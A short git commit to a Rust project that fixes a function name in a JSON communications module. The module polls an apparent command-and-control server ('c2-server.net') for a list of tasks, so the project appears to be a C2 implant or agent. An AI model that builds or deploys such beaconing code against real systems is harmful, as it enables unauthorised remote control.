0fcfc7c078c882c8b218fdfccb6e2dca253f23e0
Tyler Koistinen <koistinen.tyler@gmail.com>
2021-04-02 15:32:46 -0400

    Fix typo in get_task_request

--- src/json_comms.rs
+++ src/json_comms.rs
@@ -16,7 +16,7 @@ pub struct JsonComms {
 
 impl JsonComms {
     pub fn get_tasks(&self) -> Vec<String> {
-        let body = self._get_task_task().unwrap();
+        let body = self._get_task_request().unwrap();
         let empty_result = vec![serde_json::json!([])];
         let result = body.as_array().unwrap_or(&empty_result);
         let mut task_list = Vec::<String>::new();
@@ -27,7 +27,7 @@ impl JsonComms {
         return task_list;
     }
 
-    pub fn _get_task_task(&self) -> Result<serde_json::Value> {
+    pub fn _get_task_request(&self) -> Result<serde_json::Value> {
         let body = serde_json::json!(reqwest::blocking::get("http://api.c2-server.net/alumina/get_tasks")?.text()?);
         Ok(body)
     }
